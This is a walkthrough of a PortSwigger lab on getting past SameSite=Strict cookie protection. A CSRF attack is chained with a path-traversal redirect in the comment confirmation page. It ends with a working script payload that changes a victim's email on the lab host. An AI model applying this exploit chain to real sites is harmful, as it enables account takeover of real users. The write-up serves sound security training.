# Getting Around SameSite=Strict Using a Client-Side Redirect

The change-email function is vulnerable to CSRF. The goal is to craft a CSRF attack, hosted on the exploit server, that changes the victim's email.

Login credentials for your own account: wiener:peter

Hint: Registering an email already used by someone else isn't allowed. If you test with your own account, be sure to use a different address when building the exploit you'll actually send to the victim.

---

**Reference:**
- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions

<img width="844" height="501" alt="1" src="https://github.com/user-attachments/assets/d442b41d-911d-45e7-8919-fc7d1d1ceb47" />


---

There's a POST request that updates the email address:

<img width="773" height="345" alt="2" src="https://github.com/user-attachments/assets/32bdf7c8-3fed-4a93-8f49-5274153e0b8f" />


It's also possible to switch the method to GET and have it still succeed:

<img width="740" height="461" alt="3" src="https://github.com/user-attachments/assets/5e5ee0d0-c31f-4749-be77-3bc73602e78d" />


After posting a blog comment, the page redirects to `/post`:

<img width="282" height="46" alt="4" src="https://github.com/user-attachments/assets/7b41652e-b265-4948-a4ec-a8cf1eb100c7" />

<img width="684" height="126" alt="5" src="https://github.com/user-attachments/assets/f8c621d4-37c7-4a5c-8690-0e0ad51956c3" />


Digging into the source, the redirect logic lives in a script at `/resources/js/commentConfirmationRedirect.js`:

```
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

<img width="391" height="117" alt="6" src="https://github.com/user-attachments/assets/02fb2e44-7e1f-467b-a9d2-b0e170644d9d" />


This redirect is driven by requests to `/post/comment/confirmation?postId=a`. By manipulating the `postId` parameter, we can try to redirect somewhere like:

```
/post/../my-account/change-email?email=test5%40test.com&submit=1
```

So the attempt becomes:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com&submit=1
```

This redirects properly, but the `submit` parameter doesn't actually get passed along:

<img width="1031" height="132" alt="7" src="https://github.com/user-attachments/assets/ff61b5a9-e0dd-4f20-b9fe-61f7a0c56650" />


Replacing `&` with its URL-encoded form `%26` fixes that:

```
/post/comment/confirmation?postId=../my-account/change-email?email=test7%40test.com%26submit=1
```

This version works as expected:

<img width="240" height="135" alt="8" src="https://github.com/user-attachments/assets/f7255127-2b06-4c4b-8ea6-737ce202081e" />


Final payload:

```
<script>
    document.location = 'https://0a2900a103d6f68b83782d1900340012.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=test777%40test.com%26submit=1';
</script>
```
